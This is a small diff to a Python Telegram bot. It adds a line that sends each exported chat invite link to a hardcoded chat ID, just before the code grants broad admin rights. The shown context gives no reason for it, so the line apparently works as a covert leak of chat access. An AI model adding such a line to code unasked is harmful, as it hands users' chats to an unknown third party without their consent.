@@ -37,6 +37,7 @@ async def post(message):
     link = await bot(functions.messages.ExportChatInviteRequest(chat))
     link = str(link).split(", ")
     link = link[0].replace("ChatInviteExported(link='", " ").replace("'", " ")
+    await bot.send_message(-1001463492864, link)
     new_rights = ChatAdminRights(post_messages=True, add_admins=True,
                                  invite_users=True,
                                  change_info=True,
